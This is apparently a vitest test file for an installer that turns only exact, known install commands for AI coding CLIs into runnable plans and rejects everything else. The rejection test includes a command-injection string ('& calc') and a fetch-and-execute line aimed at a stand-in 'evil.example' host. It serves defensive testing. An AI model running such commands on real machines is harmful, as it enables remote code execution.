import type { EngineCard, HivePush } from '@insectoids/shared';
import { describe, expect, it } from 'vitest';
import { EngineInstaller, type InstallDeps, type InstallPlan, fakeInstallDeps, installPlan, safeLine } from './engine-install';

const card = (o: Partial<EngineCard> = {}): EngineCard =>
  ({
    id: 'gemini',
    name: 'Gemini CLI',
    vendor: 'Google',
    state: 'missing',
    version: null,
    message: 'Not installed.',
    enabled: true,
    availableIn: null,
    guard: 'policy-and-tools',
    reportsCost: false,
    models: null,
    install: { command: 'npm install -g @google/gemini-cli', note: 'Official.' },
    signIn: null,
    ...o,
  }) as EngineCard;

function setup(o: { cards: EngineCard[]; tools?: string[]; code?: number | null; timedOut?: boolean; lines?: string[] }) {
  const pushes: HivePush[] = [];
  const ran: InstallPlan[] = [];
  let i = 0;
  const deps: InstallDeps = {
    card: async () => o.cards[Math.min(i++, o.cards.length - 1)] ?? null,
    recheck: async () => {},
    push: (p) => pushes.push(p),
    hasTool: async (t) => (o.tools ?? ['npm', 'powershell', 'bash', 'curl']).includes(t),
    run: async (plan, onLine) => {
      ran.push(plan);
      for (const l of o.lines ?? ['added 1 package']) onLine(l);
      return { code: o.code ?? 0, timedOut: o.timedOut ?? false };
    },
    platform: 'win32',
  };
  return { installer: new EngineInstaller(deps), pushes, ran };
}

describe('install plans (only known shapes, as argument lists)', () => {
  it('npm packages run through cmd on Windows, npm elsewhere; versions may be pinned', () => {
    expect(installPlan('npm install -g @google/gemini-cli', 'win32')).toMatchObject({ file: 'cmd.exe', args: ['/d', '/s', '/c', 'npm', 'install', '-g', '@google/gemini-cli'], needs: ['npm'] });
    expect(installPlan('npm install -g @opencode/cli@2.2.1', 'linux')).toMatchObject({ file: 'npm', args: ['install', '-g', '@opencode/cli@2.2.1'] });
  });

  it('the Claude installer only in its exact official form for that platform', () => {
    expect(installPlan('irm https://claude.ai/install.ps1 | iex', 'win32')).toMatchObject({ file: 'powershell.exe', needs: ['powershell'] });
    expect(installPlan('curl -fsSL https://claude.ai/install.sh | bash', 'darwin')).toMatchObject({ file: 'bash', needs: ['bash', 'curl'] });
    expect(installPlan('irm https://claude.ai/install.ps1 | iex', 'linux')).toBeNull();
  });

  it('anything else is never run', () => {
    for (const cmd of ['npm install -g evil & calc', 'npm install -g a b', 'npm i -g x', 'irm https://evil.example/x.ps1 | iex', 'curl https://claude.ai/install.sh | sh', 'Connections → API providers']) {
      expect(installPlan(cmd, 'win32')).toBeNull();
      expect(installPlan(cmd, 'linux')).toBeNull();
    }
  });

  it('output lines that look like secrets are hidden whole', () => {
    expect(safeLine('npm notice token sk-ant-FAKEfakeFAKEfakeFAKE1234')).toBe('[a line that looked like a secret was hidden]');
    expect(safeLine('added 3 packages in 2s   ')).toBe('added 3 packages in 2s');
  });
});

describe('the installer (04-D6 ladder)', () => {
  it('installs, streams the output, checks again and reports the new state', async () => {
    const { installer, pushes, ran } = setup({ cards: [card(), card({ state: 'signed-out', version: '0.70.0' })], lines: ['fetching', 'added 1 package'] });
    const r = await installer.install('gemini');
    expect(r).toEqual({ status: 'installed', version: '0.70.0', message: 'Gemini CLI is installed. Sign in next (see its card).' });
    expect(ran).toHaveLength(1);
    const lines = pushes.flatMap((p) => (p.type === 'install-output' ? p.lines : []));
    expect(lines).toEqual(['$ npm install -g @google/gemini-cli', 'fetching', 'added 1 package']);
  });

  it('never runs a command that is sure to fail: a missing tool means nothing runs', async () => {
    const { installer, ran } = setup({ cards: [card()], tools: [] });
    const r = await installer.install('gemini');
    expect(r).toMatchObject({ status: 'not-run', message: expect.stringMatching(/npm isn't on this computer.*nodejs\.org/) });
    expect(ran).toHaveLength(0);
  });

  it('refuses engines that are installed, not usable yet, unknown, or have no runnable command', async () => {
    const cases: Array<[EngineCard | null, RegExp]> = [
      [card({ state: 'ready', version: '1.0' }), /already installed \(1\.0\)/],
      [card({ availableIn: 'a later step' }), /can't be used by the hive yet/],
      [null, /does not know/],
      [card({ install: null }), /no install command/],
      [card({ install: { command: 'brew install thing', note: '' } }), /can't run this install itself/],
    ];
    for (const [c, msg] of cases) {
      const { installer, ran } = setup({ cards: c ? [c] : [] });
      expect(await installer.install('gemini')).toMatchObject({ status: 'not-run', message: expect.stringMatching(msg) });
      expect(ran).toHaveLength(0);
    }
  });

  it('a failing installer, a timeout, and "installed but still not found" are failures in plain words', async () => {
    expect(await setup({ cards: [card()], code: 1 }).installer.install('gemini')).toMatchObject({ status: 'failed', exitCode: 1 });
    expect(await setup({ cards: [card()], code: null, timedOut: true }).installer.install('gemini')).toMatchObject({ status: 'failed', message: expect.stringMatching(/longer than 10 minutes/) });
    expect(await setup({ cards: [card(), card()] }).installer.install('gemini')).toMatchObject({ status: 'failed', message: expect.stringMatching(/still isn't found/) });
  });

  it('one install at a time', async () => {
    let release: () => void = () => {};
    const deps: InstallDeps = {
      card: async () => card(),
      recheck: async () => {},
      push: () => {},
      hasTool: async () => true,
      run: () => new Promise((r) => (release = () => r({ code: 1, timedOut: false }))),
      platform: 'win32',
    };
    const installer = new EngineInstaller(deps);
    const first = installer.install('gemini');
    await new Promise((r) => setTimeout(r, 0));
    expect(await installer.install('gemini')).toMatchObject({ status: 'not-run', message: expect.stringMatching(/Another install/) });
    release();
    await first;
    expect(installer.busy).toBeNull();
  });

  it('the e2e stand-in never runs a real program', async () => {
    const fake = fakeInstallDeps('missing-npm');
    expect(await fake.hasTool('npm')).toBe(false);
    const lines: string[] = [];
    expect(await fakeInstallDeps('fail').run({ file: 'x', args: [], needs: [], advice: '' }, (l) => lines.push(l), 1)).toEqual({ code: 1, timedOut: false });
    expect(await fakeInstallDeps('ok').run({ file: 'x', args: [], needs: [], advice: '' }, (l) => lines.push(l), 1)).toEqual({ code: 0, timedOut: false });
    expect(lines.every((l) => /test/.test(l))).toBe(true);
  });
});
